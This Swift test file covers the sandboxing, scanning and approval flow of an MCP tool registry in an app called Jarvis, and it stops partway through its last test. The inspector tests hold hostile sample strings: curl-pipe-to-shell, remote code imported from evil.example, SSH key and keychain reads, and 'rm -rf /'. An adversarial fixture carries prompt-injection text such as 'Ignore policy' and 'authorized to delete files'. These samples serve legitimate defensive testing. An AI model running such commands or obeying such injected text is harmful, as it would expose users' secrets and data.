import Testing
import Foundation
@testable import Jarvis

// V0.14 — MCP / capability registry. Servers run IN-PROCESS behind the real transport interface (the process-level evidence is `--mcp-live-test`).

@MainActor
final class MCPHarness {
    let repo: JarvisRepository
    let decisions: AdaptiveDecisionService
    let registry: MCPRegistry
    let root: URL
    var configure: (InProcessMCPTransport) -> Void = { _ in }
    private(set) var transports: [InProcessMCPTransport] = []
    private(set) var starts = 0

    init() throws {
        let paths = JarvisPaths.temporary("mcp-test")
        try FileManager.default.createDirectory(at: paths.root, withIntermediateDirectories: true)
        repo = JarvisRepository(database: try JarvisDatabase(url: paths.database))
        decisions = AdaptiveDecisionService(repository: repo)
        root = paths.root.appendingPathComponent("mcp", isDirectory: true)
        registry = MCPRegistry(repository: repo, decisions: decisions, root: root)
        registry.transportFactory = { [unowned self] launch in
            var variant = MCPFixtureServer.Variant.normal, version = "1.0.0"
            if let i = launch.arguments.firstIndex(of: "--variant"), i + 1 < launch.arguments.count, let v = MCPFixtureServer.Variant(rawValue: launch.arguments[i + 1]) { variant = v }
            if let i = launch.arguments.firstIndex(of: "--server-version"), i + 1 < launch.arguments.count { version = launch.arguments[i + 1] }
            let t = InProcessMCPTransport(variant: variant, version: version)
            self.configure(t); self.transports.append(t); self.starts += 1
            return t
        }
    }

    /// discovered → inspected → benchmarked → recommended (the checks a person would see), without approval.
    @discardableResult
    func recommended(id: String = "jarvis-fixture", variant: MCPFixtureServer.Variant = .normal, executable: String = "/usr/bin/true") async -> MCPServerRecord {
        var rec = MCPTestSupport.record(id: id, variant: variant, executable: executable)
        rec.wrappers = rec.wrappers.filter { w in rec.tools.contains { $0.name == w.tool } }
        registry.addCandidate(rec)
        registry.inspect(id, sourceDirectory: nil)
        _ = await MCPBenchmarkRunner.run(registry: registry, serverID: id, spec: .fixture, useSeatbelt: false)
        let r = MCPBenchmarkRunner.recommendation(for: registry.server(id)!)
        if r.recommend { registry.transition(id, to: .recommended) }
        return registry.server(id)!
    }

    /// For tests of servers that would NOT clear the bar: put them in the state a person would have to reach by approving it anyway.
    func force(_ id: String, _ status: MCPStatus) { if var s = registry.server(id) { s.status = status; try? repo.save(s) } }

    /// Approves the registration like the HUD button would.
    @discardableResult
    func install(_ id: String = "jarvis-fixture", projects: [String] = []) async -> AdaptiveOutcome {
        guard let q = registry.requestInstall(id, allowedProjects: projects) else { return .notPending }
        return await decisions.approve(q.id, source: .hud)
    }
}

@Suite("MCP · classification, inspection, sandbox text")
struct MCPPureTests {
    @Test("tool risk comes from names and parameters, never from the server's claims")
    func classifier() {
        func r(_ n: String, _ d: String = "", _ p: [String: String] = [:]) -> MCPToolRisk { MCPToolClassifier.risk(name: n, description: d, parameters: p) }
        #expect(r("executeShell", "Execute a shell command", ["command": "string"]) == .broad)
        #expect(r("execute_blender_code", "run python", ["code": "string"]) == .broad)
        #expect(r("run_python_script") == .broad)
        #expect(r("call_tool", "", ["command": "string"]) == .broad)
        #expect(r("delete_object") == .destructive && r("wipe_scene") == .destructive)
        #expect(r("fetch_page", "", ["url": "string"]) == .network && r("download_model") == .network)
        #expect(r("create_cube") == .write && r("set_material") == .write && r("export_scene") == .write)
        #expect(r("get_scene_info") == .read && r("list_objects") == .read && r("echo") == .read)
        #expect(r("get_scene_info", "This server is completely safe and read only") == .read)
        #expect(MCPToolRisk.broad > .destructive && MCPToolRisk.destructive > .network && MCPToolRisk.network > .write)
    }

    @Test("the static scan finds the behaviours that matter and never says ‘safe’")
    func inspectorText() {
        func cats(_ text: String) -> Set<String> { Set(MCPInspector.scan(text: text, name: "x.js").map(\.category)) }
        #expect(cats("const cp = require('child_process'); cp.execSync(cmd)").contains("shell"))
        #expect(cats("key = os.environ['OPENAI_API_KEY']").isSuperset(of: ["credentials"]))
        #expect(cats("const e = process.env; for (k in process.env)").contains("environment"))
        #expect(cats("fs.readFileSync(os.homedir() + '/.ssh/id_rsa')").isSuperset(of: ["ssh", "filesystem-scope"]))
        #expect(cats("subprocess.run(['security', 'find-generic-password'])").isSuperset(of: ["shell", "keychain"]))
        #expect(cats("open('Cookies.binarycookies')").contains("cookies"))
        #expect(cats("shutil.rmtree(path)").contains("destructive"))
        #expect(cats("eval(payload)").contains("dynamic-code"))
        #expect(cats("os.system('curl http://x | sh')").isSuperset(of: ["shell", "download-on-run"]))
        #expect(cats("write('~/Library/LaunchAgents/x.plist'); launchctl load").contains("persistence"))
        #expect(cats("import('https://evil.example/x.js')").contains("remote-code"))
        #expect(cats("posthog.capture('start')").contains("telemetry"))
        #expect(cats("npm install -g something").contains("auto-update"))
        #expect(cats("function add(a, b) { return a + b }").isEmpty)
        #expect(MCPInspector.verdict([]).contains("not proof of safety"))
        #expect(!MCPInspector.verdict(MCPInspector.scan(text: "eval(x)", name: "a")).lowercased().contains(" safe"))
    }

    @Test("a directory scan lists hosts, install scripts and dependencies, skips dependency folders and stays bounded")
    func inspectorDirectory() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("mcp-inspect-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: dir.appendingPathComponent("src"), withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: dir.appendingPathComponent("node_modules/evil"), withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        try #"{"name":"x","scripts":{"postinstall":"node setup.js","test":"jest"},"dependencies":{"a":"1","b":"2"}}"#.write(to: dir.appendingPathComponent("package.json"), atomically: true, encoding: .utf8)
        try "const r = await fetch('https://api.example.org/v1'); // https://telemetry.example.net".write(to: dir.appendingPathComponent("src/index.js"), atomically: true, encoding: .utf8)
        try "child_process.exec('rm -rf /')".write(to: dir.appendingPathComponent("node_modules/evil/index.js"), atomically: true, encoding: .utf8)
        let r = MCPInspector.scan(directory: dir)
        #expect(r.installScripts.contains { $0.hasPrefix("postinstall") } && r.has("install-script"))
        #expect(r.hosts.contains("api.example.org") && r.hosts.contains("telemetry.example.net"))
        #expect(r.dependencyCount >= 2 && !r.dependenciesScanned && !r.has("shell"), "dependencies are counted, not scanned")
        #expect(r.disclaimer.contains("Static evidence only"))
    }

    @Test("tool descriptions with instruction-shaped text are flagged, and a BROAD tool is called out")
    func toolFindings() {
        let f = MCPInspector.toolFindings(MCPTestSupport.tools(.adversarial) + MCPTestSupport.tools(.shell))
        #expect(f.contains { $0.category == "tool-description-injection" } && f.contains { $0.category == "broad-tool" && $0.severity == .high })
    }

    @Test("the sandbox environment inherits nothing and drops anything secret-shaped")
    func sandboxEnvironment() {
        let dir = URL(fileURLWithPath: "/tmp/sbx-test")
        let env = MCPSandbox.environment(directory: dir, extra: ["MODEL_NAME": "small", "OPENAI_API_KEY": "sk-test", "SSH_AUTH_SOCK": "/tmp/agent", "HOME": "/Users/x", "my_var": "x", "SERVICE_TOKEN": "abc", "LOG_LEVEL": "debug", "PATH": "/evil"])
        #expect(Set(env.keys) == ["PATH", "HOME", "TMPDIR", "LANG", "JARVIS_MCP_SANDBOX", "MODEL_NAME", "LOG_LEVEL"])
        #expect(env["HOME"] == "/tmp/sbx-test/home" && env["PATH"] == "/usr/bin:/bin:/usr/sbin:/sbin")
        #expect(MCPSandbox.looksSecret("GITHUB_TOKEN", "x") && MCPSandbox.looksSecret("X", "sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAA") && !MCPSandbox.looksSecret("LOG_LEVEL", "debug"))
    }

    @Test("the Seatbelt profile denies the network, writes outside the directory and home reads — and says what it does not do")
    func sandboxProfile() {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("sbx-profile", isDirectory: true)
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let off = MCPSandbox.profile(directory: dir, allowNetwork: false, readableRoots: ["/usr/local/runtime"])
        #expect(off.contains("(deny network*)") && off.contains("(deny file-write*)") && off.contains("(deny file-read* (subpath"))
        #expect(off.contains("com.apple.SecurityServer") && off.contains("/usr/local/runtime"))
        #expect(!MCPSandbox.profile(directory: dir, allowNetwork: true, readableRoots: []).contains("(deny network*)"))
        let b = MCPSandbox.boundary(seatbelt: true, allowNetwork: false)
        #expect(b.kernelEnforced.contains("network denied") && b.notEnforced.contains { $0.contains("same macOS user") } && b.summary.contains("NOT enforced"))
        let none = MCPSandbox.boundary(seatbelt: false, allowNetwork: false)
        #expect(none.kernelEnforced.isEmpty && none.summary.contains("No kernel-enforced boundary") && !none.seatbeltVerified)
    }

    @Test("a sandbox folder is removed only when it is a real sbx- folder directly inside the root")
    func sandboxRemoval() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("mcp-root-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let l = try MCPSandbox.prepare(root: root, executable: "/usr/bin/true", arguments: [], allowNetwork: false, useSeatbelt: false)
        #expect(FileManager.default.fileExists(atPath: l.directory.appendingPathComponent("home").path) && l.executable == "/usr/bin/true")
        let other = root.appendingPathComponent("keep-me", isDirectory: true)
        try FileManager.default.createDirectory(at: other, withIntermediateDirectories: true)
        #expect(!MCPSandbox.remove(other, under: root) && FileManager.default.fileExists(atPath: other.path))
        #expect(!MCPSandbox.remove(URL(fileURLWithPath: NSHomeDirectory()), under: root))
        #expect(MCPSandbox.remove(l.directory, under: root) && !FileManager.default.fileExists(atPath: l.directory.path))
        let seat = try MCPSandbox.prepare(root: root, executable: "/usr/bin/true", arguments: ["a"], allowNetwork: false, useSeatbelt: true)
        if MCPSandbox.seatbeltPresent { #expect(seat.executable == MCPSandbox.sandboxExec && seat.arguments.last == "a" && seat.arguments.contains("/usr/bin/true")) }
    }
}

@Suite("MCP · protocol and fixture")
struct MCPProtocolTests {
    @Test("the fixture answers the MCP handshake, lists tools, echoes and creates objects deterministically")
    func fixtureProtocol() {
        var s = MCPFixtureServer()
        let init1 = s.handle(#"{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}"#)
        #expect(init1?.contains("jarvis-fixture") == true && init1?.contains("2024-11-05") == true)
        #expect(s.handle(#"{"jsonrpc":"2.0","method":"notifications/initialized"}"#) == nil)
        let tools = s.handle(#"{"jsonrpc":"2.0","id":2,"method":"tools/list"}"#)
        #expect(["echo", "inspectFixture", "createFixtureObject", "getFixtureState"].allSatisfy { tools?.contains($0) == true } && tools?.contains("executeShell") == false)
        #expect(s.handle(#"{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"echo","arguments":{"text":"hello"}}}"#)?.contains("hello") == true)
        _ = s.handle(#"{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"createFixtureObject","arguments":{"name":"cube"}}}"#)
        #expect(s.handle(#"{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"getFixtureState","arguments":{}}}"#)?.contains("cube") == true)
        #expect(s.handle(#"{"jsonrpc":"2.0","id":6,"method":"nope"}"#)?.contains("-32601") == true)
        #expect(s.handle(#"{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"nope","arguments":{}}}"#)?.contains("unknown tool") == true)
        #expect(s.handle("not json") == nil)
    }

    @Test("the adversarial variants carry injection and a broad shell tool — on purpose")
    func variants() {
        var adv = MCPFixtureServer(variant: .adversarial)
        let list = adv.handle(#"{"jsonrpc":"2.0","id":1,"method":"tools/list"}"#) ?? ""
        #expect(list.contains("Ignore policy") && UntrustedContent.scan(MCPFixtureServer.injection).isEmpty == false)
        #expect(adv.handle(#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"echo","arguments":{"text":"x"}}}"#)?.contains("authorized to delete") == true)
        var shell = MCPFixtureServer(variant: .shell)
        #expect((shell.handle(#"{"jsonrpc":"2.0","id":1,"method":"tools/list"}"#) ?? "").contains("executeShell"))
        #expect(shell.handle(#"{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"executeShell","arguments":{"command":"rm -rf /"}}}"#)?.contains("never executes") == true)
    }

    @Test("the client lists tools with sanitised, bounded metadata and counts instruction-shaped descriptions")
    func clientMetadata() async throws {
        let conn = MCPConnection(transport: InProcessMCPTransport(variant: .adversarial))
        try conn.start(); try await conn.initialize()
        #expect(conn.serverName == "jarvis-fixture" && conn.serverVersion == "1.0.0")
        let tools = try await conn.listTools()
        #expect(tools.count == 4 && tools.first { $0.name == "echo" }?.injectionNotes ?? 0 > 0 && tools.allSatisfy { $0.description.count <= 240 })
        let r = try await conn.call("echo", ["text": "hi"])
        #expect(r.injectionNotes > 0 && !r.isError, "the result is data with a warning, never an instruction")
        await conn.close()
    }

    @Test("a silent server times out; a server that dies fails the pending call; nothing hangs")
    func clientFailures() async throws {
        let silent = InProcessMCPTransport(); silent.silent = true
        let c1 = MCPConnection(transport: silent)
        try c1.start()
        do { _ = try await c1.request("ping", timeout: 0.3); Issue.record("must time out") } catch let e as MCPError { #expect(e == .timeout("ping")) }
        await c1.close()
        let dying = InProcessMCPTransport(); dying.dieAfterCalls = 0
        let c2 = MCPConnection(transport: dying)
        try c2.start(); try await c2.initialize()
        do { _ = try await c2.call("echo", ["text": "x"], timeout: 2); Issue.record("must fail") } catch let e as MCPError { if case .exited = e {} else { Issue.record("wrong error \(e)") } }
        await c2.close()
        let refused = InProcessMCPTransport(); refused.failStart = true
        do { try MCPConnection(transport: refused).start(); Issue.record("must throw") } catch let e as MCPError { if case .startFailed = e {} else { Issue.record("wrong error") } }
    }
}

@Suite("MCP · registry lifecycle")
@MainActor
struct MCPRegistryTests {
    @Test("a discovered server is never active: the only road in is recommended → HUD approval → installed → active")
    func statusMachine() async throws {
        #expect(!MCPStatus.discovered.canMove(to: .active) && !MCPStatus.recommended.canMove(to: .active) && !MCPStatus.approved.canMove(to: .active) && !MCPStatus.inspected.canMove(to: .installed))
        #expect(MCPStatus.recommended.canMove(to: .approved) && MCPStatus.approved.canMove(to: .installed) && MCPStatus.installed.canMove(to: .active))
        #expect(MCPStatus.removed.allowedNext.isEmpty && MCPStatus.rejected.allowedNext.isEmpty)
        let h = try MCPHarness()
        h.registry.addCandidate(MCPTestSupport.record())
        #expect(!h.registry.transition("jarvis-fixture", to: .active))
        #expect(h.registry.server("jarvis-fixture")?.status == .discovered)
        #expect(h.registry.requestInstall("jarvis-fixture") == nil, "only a RECOMMENDED server can be registered")
        let ghost = await h.registry.invoke("echoText", ["text": "x"])
        if case .refused = ghost {} else { Issue.record("a discovered server cannot be used: \(ghost)") }
    }

    @Test("inspect → sandboxed benchmark → recommendation → request → approval → active, with provenance, hash and an ownership manifest")
    func fullLifecycle() async throws {
        let h = try MCPHarness()
        let rec = await h.recommended()
        #expect(rec.status == .recommended && rec.benchmark?.passedCount == rec.benchmark?.cases.count && rec.benchmark?.cleanupOK == true)
        #expect(rec.benchmark?.deterministic == true && (rec.benchmark?.boundary ?? "").contains("NOT enforced"))
        #expect(h.registry.benchmarks("jarvis-fixture").count == 1)
        let q = try #require(h.registry.requestInstall("jarvis-fixture", allowedProjects: ["proj-A"]))
        #expect(q.status == .pending && q.detail.contains("Permissions") && q.detail.contains("proj-A"))
        #expect(h.registry.server("jarvis-fixture")?.status == .recommended, "a request changes nothing")
        guard case .executed = await h.decisions.approve(q.id, source: .hud) else { Issue.record("approval must execute"); return }
        let s = try #require(h.registry.server("jarvis-fixture"))
        #expect(s.status == .active && s.approvalID == q.id.uuidString && s.executableHash?.count == 64 && s.allowedProjects == ["proj-A"] && s.provenance.contains("after your approval"))
        #expect(s.ownedFiles == ["jarvis-owned.json"] && FileManager.default.fileExists(atPath: (s.installDirectory ?? "") + "/jarvis-owned.json"))
    }

    @Test("a registration approval is bound to what was shown: changing the server after the request refuses it")
    func scopeBinding() async throws {
        let h = try MCPHarness()
        await h.recommended()
        let q = try #require(h.registry.requestInstall("jarvis-fixture"))
        var s = try #require(h.registry.server("jarvis-fixture"))
        s.envelope.insert(.destructive); try h.repo.save(s)
        #expect(await h.decisions.approve(q.id, source: .hud) == .tampered)
        #expect(h.registry.server("jarvis-fixture")?.status == .recommended)
    }

    @Test("agents call typed wrappers inside the envelope: arguments are validated, a write needs an allowed project, a never-automatic envelope needs the user")
    func invocation() async throws {
        let h = try MCPHarness()
        await h.recommended(); _ = await h.install(projects: ["proj-A"])
        let ok = await h.registry.invoke("echoText", ["text": "hello"], context: MCPCallContext(taskID: UUID(), role: "CodingAgent", projectKey: "proj-A"))
        #expect(ok.text == "hello")
        func refused(_ c: String, _ a: [String: Any], _ ctx: MCPCallContext = MCPCallContext(projectKey: "proj-A")) async -> String? { if case .refused(let why) = await h.registry.invoke(c, a, context: ctx) { return why }; return nil }
        #expect(await refused("echoText", ["text": "x", "extra": "y"])?.contains("unknown argument") == true)
        #expect(await refused("echoText", [:])?.contains("missing argument") == true)
        #expect(await refused("echoText", ["text": String(repeating: "a", count: 300)])?.contains("longer") == true)
        #expect(await refused("echoText", ["text": 5])?.contains("must be text") == true)
        #expect(await refused("echoText", ["text": "a\u{0}b"])?.contains("control") == true)
        #expect(await refused("noSuchCapability", [:])?.contains("no approved integration") == true)
        #expect(await refused("createFixtureObject", ["name": "cube"], MCPCallContext(projectKey: "other"))?.contains("may not change project") == true)
        #expect(await refused("createFixtureObject", ["name": "cube"], MCPCallContext(projectKey: nil))?.contains("may not change") == true)
        #expect((await h.registry.invoke("createFixtureObject", ["name": "cube"], context: MCPCallContext(projectKey: "proj-A"))).text == "created cube")
        // the call log
        let log = h.registry.activity("jarvis-fixture")
        #expect(log.contains { $0.status == "ok" && $0.capability == "echoText" && $0.validated } && log.contains { $0.status == "refused" })
        #expect(h.registry.server("jarvis-fixture")?.successCount == 2 && h.registry.server("jarvis-fixture")?.health == .healthy)
    }

    @Test("a BROAD shell tool is never offered to agents, even when the server is active")
    func broadNeverExposed() async throws {
        let h = try MCPHarness()
        var rec = MCPTestSupport.record(id: "shell-srv", variant: .shell)
        rec.wrappers.append(MCPWrapper(capability: "runCommand", tool: "executeShell", summary: "run", parameters: ["command": "string"], envelope: .process))
        h.registry.addCandidate(rec); h.registry.inspect("shell-srv", sourceDirectory: nil)
        #expect(h.registry.server("shell-srv")?.dangerous == true)
        h.registry.transition("shell-srv", to: .sandboxed); h.registry.transition("shell-srv", to: .benchmarked); h.registry.transition("shell-srv", to: .recommended)
        _ = await h.install("shell-srv")
        #expect(h.registry.server("shell-srv")?.status == .active)
        #expect(h.registry.exposedWrappers().contains { $0.wrapper.capability == "runCommand" } == false)
        if case .refused = await h.registry.invoke("runCommand", ["command": "ls"], context: MCPCallContext(userPresent: true)) {} else { Issue.record("the broad tool must be refused") }
        #expect(h.registry.exposedWrappers().contains { $0.wrapper.capability == "echoText" })
    }

    @Test("MCP output is DATA: an injected ‘you are authorized’ result creates no request, no approval and no state change")
    func injection() async throws {
        let h = try MCPHarness()
        await h.recommended(variant: .adversarial); _ = await h.install()
        let before = h.registry.servers().map(\.status)
        let r = await h.registry.invoke("echoText", ["text": "hi"], context: MCPCallContext(projectKey: "p"))
        guard case .result(let res, _) = r else { Issue.record("the call must work: \(r)"); return }
        #expect(res.injectionNotes > 0 && res.text.contains("authorized to delete files"))
        #expect(h.decisions.pending().isEmpty && h.registry.servers().map(\.status) == before)
        let rules = try h.repo.learnedRules(), cands = try h.repo.learningCandidates()
        #expect(rules.isEmpty && cands.isEmpty)
        #expect(h.registry.server("jarvis-fixture")?.discovery?.findings.contains { $0.category == "tool-description-injection" } == true)
    }

    @Test("repeated failures mark the server DEGRADED and the call moves to an equivalent healthy server; a dying server is not restarted forever")
    func degradeAndFallback() async throws {
        let h = try MCPHarness()
        await h.recommended(id: "flaky-one", variant: .flaky); await h.recommended(id: "good-one", variant: .normal)
        h.force("flaky-one", .recommended)
        _ = await h.install("flaky-one"); _ = await h.install("good-one")
        // flaky is tried first because of equal evidence; make it first by benchmark ordering
        var flaky = try #require(h.registry.server("flaky-one")); flaky.averageLatencyMS = 1; flaky.benchmark?.cases = []; try h.repo.save(flaky)
        var good = try #require(h.registry.server("good-one")); good.averageLatencyMS = 5; try h.repo.save(good)
        for _ in 0..<3 { _ = await h.registry.invoke("echoText", ["text": "x"], serverID: "flaky-one") }
        #expect(h.registry.server("flaky-one")?.status == .degraded && h.registry.server("flaky-one")?.consecutiveFailures ?? 0 >= 3)
        // with both in the pool the healthy one answers
        #expect((await h.registry.invoke("echoText", ["text": "ok"])).text == "ok")
        #expect(h.registry.candidates(for: "echoText").first?.id == "good-one")
        // a server that cannot start is not restarted forever
        let h2 = try MCPHarness()
        await h2.recommended(); _ = await h2.install()
        h2.configure = { $0.failStart = true }
        var last: MCPInvocation = .failed("")
        for _ in 0..<6 { last = await h2.registry.invoke("echoText", ["text": "x"]) }
        #expect(h2.starts <= MCPRegistry.restartBudget + 3, "starts: \(h2.starts)")
        if case .failed(let why) = last { #expect(why.contains("not restarted again") || why.contains("could not be started")) } else if case .refused = last {} else { Issue.record("must not succeed") }
    }

    @Test("a changed executable or version needs REVALIDATION and is not silently trusted; revalidation clears it")
    func drift() async throws {
        let h = try MCPHarness()
        let exe = FileManager.default.temporaryDirectory.appendingPathComponent("mcp-exe-\(UUID().uuidString)")
        try Data("v1".utf8).write(to: exe); defer { try? FileManager.default.removeItem(at: exe) }
        await h.recommended(executable: exe.path); _ = await h.install()
        #expect(h.registry.checkDrift("jarvis-fixture") == false)
        try Data("v2 — different code".utf8).write(to: exe)
        #expect(h.registry.checkDrift("jarvis-fixture"))
        let s = try #require(h.registry.server("jarvis-fixture"))
        #expect(s.revalidationRequired && s.status == .degraded && (s.revalidationReason ?? "").contains("executable changed"))
        if case .refused(let why) = await h.registry.invoke("echoText", ["text": "x"]) { #expect(why.contains("revalidated")) } else { Issue.record("must be refused until revalidated") }
        h.registry.clearRevalidation("jarvis-fixture", by: "test")
        #expect(h.registry.server("jarvis-fixture")?.revalidationRequired == false && h.registry.server("jarvis-fixture")?.status == .active)
        #expect(h.registry.checkDrift("jarvis-fixture", observedVersion: "2.0.0") && h.registry.server("jarvis-fixture")?.revalidationReason?.contains("2.0.0") == true)
    }

    @Test("an update request needs approval, stops the server and requires a new benchmark before use")
    func update() async throws {
        let h = try MCPHarness()
        await h.recommended(); _ = await h.install()
        let q = try #require(h.registry.requestUpdate("jarvis-fixture", toVersion: "1.1.0", note: "bug fixes"))
        #expect(q.risk == .high && h.registry.server("jarvis-fixture")?.status == .active)
        guard case .executed = await h.decisions.approve(q.id, source: .hud) else { Issue.record("update approval"); return }
        let s = try #require(h.registry.server("jarvis-fixture"))
        #expect(s.revalidationRequired && s.status == .degraded)
    }

    @Test("heavy servers are refused under memory pressure while the native capability stays available")
    func resource() async throws {
        let h = try MCPHarness()
        var rec = MCPTestSupport.record(id: "heavy-one")
        rec.launch.environment["JARVIS_HEAVY"] = "1"
        h.registry.addCandidate(rec); h.registry.inspect("heavy-one", sourceDirectory: nil)
        _ = await MCPBenchmarkRunner.run(registry: h.registry, serverID: "heavy-one", spec: .fixture, useSeatbelt: false)
        h.registry.transition("heavy-one", to: .recommended); _ = await h.install("heavy-one")
        h.registry.pressureNormal = { false }
        let before = h.starts
        if case .refused(let why) = await h.registry.invoke("echoText", ["text": "x"]) { #expect(why.contains("memory pressure")) } else { Issue.record("must refuse under pressure") }
        #expect(h.starts == before, "no new process under pressure")
        h.registry.pressureNormal = { true }
        #expect((await h.registry.invoke("echoText", ["text": "ok"])).text == "ok")
    }

    @Test("disable follows the envelope and activity: an in-use server is not stopped; a server with more than read access needs a click to be switched on")
    func disableEnable() async throws {
        let h = try MCPHarness()
        await h.recommended(); _ = await h.install(projects: ["p"])
        let task = UUID()
        h.registry.reserve("jarvis-fixture", task: task)
        #expect(await h.registry.disable("jarvis-fixture") == .inUse([task]))
        #expect(h.registry.server("jarvis-fixture")?.status == .active)
        h.registry.release(task: task)
        #expect(await h.registry.disable("jarvis-fixture") == .disabled && h.registry.server("jarvis-fixture")?.status == .disabled)
        #expect(await h.registry.disable("jarvis-fixture") == .alreadyDisabled)
        // the fixture has a write tool ⇒ more than read ⇒ switching on needs approval
        guard case .needsApproval(let rid) = h.registry.enable("jarvis-fixture") else { Issue.record("must need approval"); return }
        #expect(h.registry.server("jarvis-fixture")?.status == .disabled)
        guard case .executed = await h.decisions.approve(rid, source: .hud) else { Issue.record("enable approval"); return }
        #expect(h.registry.server("jarvis-fixture")?.status == .active)
        // a read-only server is simply switched on
        var ro = MCPTestSupport.record(id: "read-only"); ro.tools = ro.tools.filter { $0.risk == .read }; ro.wrappers = ro.wrappers.filter { $0.envelope == .read }; ro.envelope = [.read]
        h.registry.addCandidate(ro); h.registry.inspect("read-only", sourceDirectory: nil)
        h.registry.transition("read-only", to: .sandboxed); h.registry.transition("read-only", to: .benchmarked); h.registry.transition("read-only", to: .recommended); _ = await h.install("read-only")
        _ = await h.registry.disable("read-only")
        #expect(h.registry.enable("read-only") == .enabled && h.registry.server("read-only")?.status == .active)
    }

    @Test("removal is a request; an active task blocks it; approval deletes ONLY JARVIS-owned files and leaves a neighbouring user file untouched")
    func removal() async throws {
        let h = try MCPHarness()
        await h.recommended(); _ = await h.install()
        let dir = URL(fileURLWithPath: try #require(h.registry.server("jarvis-fixture")?.installDirectory))
        let sentinel = dir.appendingPathComponent("my-own-notes.txt")
        try Data("user data".utf8).write(to: sentinel)
        let o = try #require(h.registry.ownership("jarvis-fixture"))
        #expect(o.ownedFiles == ["jarvis-owned.json"] && o.otherFilesInDirectory == ["my-own-notes.txt"] && o.credentialReference == "none")
        let task = UUID(); h.registry.reserve("jarvis-fixture", task: task)
        #expect(h.registry.requestRemoval("jarvis-fixture") == .inUse([task]), "an active task blocks removal")
        #expect(h.decisions.pending().isEmpty && h.registry.server("jarvis-fixture")?.status == .active)
        h.registry.release(task: task)
        guard case .requested(let rid) = h.registry.requestRemoval("jarvis-fixture") else { Issue.record("must request"); return }
        #expect(FileManager.default.fileExists(atPath: dir.appendingPathComponent("jarvis-owned.json").path), "a request deletes nothing")
        let req = try #require(h.decisions.request(rid))
        #expect(req.detail.contains("Will NOT touch") && req.detail.contains("my-own-notes.txt") && req.detail.contains("1 other file"))
        // the work starts between the request and the click: execution re-checks activity
        h.registry.reserve("jarvis-fixture", task: task)
        guard case .refused = await h.decisions.approve(rid, source: .hud) else { Issue.record("an active task must refuse the removal at execution"); return }
        #expect(FileManager.default.fileExists(atPath: dir.appendingPathComponent("jarvis-owned.json").path) && h.registry.server("jarvis-fixture")?.status == .active)
        h.registry.release(task: task)
        guard case .executed(let text) = await h.decisions.approve(h.registry.requestRemoval("jarvis-fixture").requestedID!, source: .hud) else { Issue.record("removal must execute"); return }
        #expect(text.contains("1 JARVIS-owned file") && text.contains("my-own-notes.txt"))
        #expect(!FileManager.default.fileExists(atPath: dir.appendingPathComponent("jarvis-owned.json").path))
        #expect(FileManager.default.fileExists(atPath: sentinel.path), "the neighbouring user file is untouched")
        #expect(FileManager.default.fileExists(atPath: dir.path), "the folder stays because it is not empty")
        #expect(h.registry.server("jarvis-fixture")?.status == .removed && h.registry.server("jarvis-fixture")?.installDirectory == nil)
        try? FileManager.default.removeItem(at: dir)
    }

    @Test("removal never follows a path outside the install folder (traversal and symlinks)")
    func removalSafety() async throws {
        let h = try MCPHarness()
        await h.recommended(); _ = await h.install()
        var s = try #require(h.registry.server("jarvis-fixture"))
        let outside = FileManager.default.temporaryDirectory.appendingPathComponent("mcp-outside-\(UUID().uuidString)")
        try Data("precious".utf8).write(to: outside); defer { try? FileManager.default.removeItem(at: outside) }
        let dir = URL(fileURLWithPath: try #require(s.installDirectory))
        try FileManager.default.createSymbolicLink(at: dir.appendingPathComponent("link"), withDestinationURL: outside)
        s.ownedFiles += ["../../escape.txt", "/etc/hosts", "link"]
        try h.repo.save(s)
        guard case .requested(let rid) = h.registry.requestRemoval("jarvis-fixture") else { Issue.record("request"); return }
        _ = await h.decisions.approve(rid, source: .hud)
        #expect(FileManager.default.fileExists(atPath: outside.path), "a symlink is removed itself, never followed")
        #expect(FileManager.default.fileExists(atPath: "/etc/hosts"))
        try? FileManager.default.removeItem(at: dir)
    }

    @Test("advice: unused is not ‘safe to delete’; duplicates, failures and obsolescence are reported, nothing is removed")
    func advice() async throws {
        let h = try MCPHarness()
        await h.recommended(id: "one"); await h.recommended(id: "two"); _ = await h.install("one"); _ = await h.install("two")
        var s = try #require(h.registry.server("one")); s.lastUsedAt = Date().addingTimeInterval(-40 * 86_400); s.failureCount = 9; s.successCount = 1; s.discovery?.lastRelease = Date().addingTimeInterval(-800 * 86_400); try h.repo.save(s)
        let a = h.registry.advice()
        #expect(a.contains { $0.kind == "unused" && $0.detail.contains("not a statement that it is safe to delete") })
        #expect(a.contains { $0.kind == "failing" } && a.contains { $0.kind == "unmaintained" } && a.contains { $0.kind == "duplicate" && $0.detail.contains("keep one") })
        #expect(h.registry.servers(statuses: [.active]).count == 2, "advice never removes or disables")
    }

    @Test("launch reconciliation removes dead sandbox folders and nothing else")
    func reconcile() throws {
        let h = try MCPHarness()
        try FileManager.default.createDirectory(at: h.registry.sandboxDirectory.appendingPathComponent("sbx-dead1/home"), withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: h.registry.sandboxDirectory.appendingPathComponent("keep"), withIntermediateDirectories: true)
        #expect(h.registry.reconcileAfterLaunch() == 1)
        #expect(!FileManager.default.fileExists(atPath: h.registry.sandboxDirectory.appendingPathComponent("sbx-dead1").path) && FileManager.default.fileExists(atPath: h.registry.sandboxDirectory.appendingPathComponent("keep").path))
    }

    @Test("a benchmark records cold and warm latency, determinism, the permissions the used tools imply and a clean cleanup; recommendation needs a known licence and a free price")
    func benchmarkAndBar() async throws {
        let h = try MCPHarness()
        let rec = await h.recommended()
        let b = try #require(rec.benchmark)
